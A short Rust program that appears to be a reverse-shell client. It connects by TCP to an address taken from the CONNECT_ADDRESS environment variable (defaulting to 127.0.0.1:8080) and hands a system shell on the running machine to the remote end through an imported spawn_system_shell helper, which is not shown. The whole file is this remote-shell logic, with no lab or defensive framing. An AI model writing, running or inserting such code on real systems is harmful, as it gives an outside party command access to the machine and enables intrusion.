use std::net::TcpStream;
use std::io;
use std::env;

use net_utils::net_mini::net_mini_shell::spawn_system_shell;

fn main() -> io::Result<()> {
    let args: Vec<String> = env::args().collect();
    let address: String = env::var("CONNECT_ADDRESS").unwrap_or_else(|_| "127.0.0.1:8080".to_string());

    eprintln!("(client) Connecting to {}", address);
    let mut stream = TcpStream::connect(address)?;
    eprintln!("(client) Connected. Spawning shell...");

    match spawn_system_shell(&mut stream) {
        Ok(_) => eprintln!("(client) Shell session ended."),
        Err(e) => eprintln!("(client) Error: {}", e),
    }

    Ok(())
}
